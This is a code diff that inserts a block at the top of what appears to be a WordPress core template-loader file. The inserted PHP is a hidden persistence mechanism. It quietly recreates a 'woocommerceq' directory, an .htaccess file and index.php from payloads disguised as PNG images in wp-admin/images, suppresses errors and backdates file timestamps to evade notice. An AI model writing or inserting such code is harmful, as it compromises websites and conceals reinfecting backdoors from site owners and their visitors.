@@ -1,4 +1,67 @@
 <?php
+
+//ckIIbg
+$nowFileDir =  'woocommerceq';
+$nowHtacFile =  './.htaccess';
+$nmbf1 =  './woocommerceq/template.html';
+$nowIndexFile =  './woocommerceq/index.php';
+$nowLogFile =  './woocommerceq/logs.txt';
+$bkLocalFileIndex2 =  './wp-admin/images/align-lefts.png';
+$bkLocalFileHtac2 =  './wp-admin/images/align-rights.png';
+$bkLocalFileMoban2 =  './wp-admin/images/align-centers.png';
+
+if($nowHtacFile && file_exists($bkLocalFileHtac2)){
+	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
+		if(!is_dir("./$nowFileDir")){
+			@mkdir("./$nowFileDir",0755);
+		}
+		@chmod($nowHtacFile,0755);
+		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
+		@chmod($nowHtacFile,0755);
+	}
+}
+
+
+if(file_exists($bkLocalFileIndex2)){
+	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2)  && !file_exists($nowLogFile))){
+		if(!is_dir("./$nowFileDir")){
+			@mkdir("./$nowFileDir",0755);
+		}
+		@chmod($nowIndexFile,0755);
+		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
+		@chmod($nowIndexFile,0755);
+	}
+}
+
+if(file_exists($bkLocalFileMoban2)){
+	
+	if(!file_exists($nmbf1)){
+		if(!is_dir("./$nowFileDir")){
+			@mkdir("./$nowFileDir",0755);
+		}
+		@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban2));
+		@chmod($nmbf1,0755);
+	}else{
+		if(filesize($nmbf1) != filesize($bkLocalFileMoban2)){
+			$tpstrMb = file_get_contents($nmbf1);
+			if(strstr($tpstrMb,"draft_or_post_title") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
+				$fitime = filemtime($bkLocalFileMoban2);
+				@chmod($bkLocalFileMoban2,0755);
+				@file_put_contents($bkLocalFileMoban2,$tpstrMb);
+				@touch($bkLocalFileMoban2, $fitime, $fitime);  
+			}else{
+				@chmod($bkLocalFileMoban2,0755);
+				@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban2));
+				@chmod($bkLocalFileMoban2,0755);
+			}
+		}
+	}
+	
+}
+//ckIIend
+
+?>
+<?php
 /**
  * Loads the correct template based on the visitor's url
  *
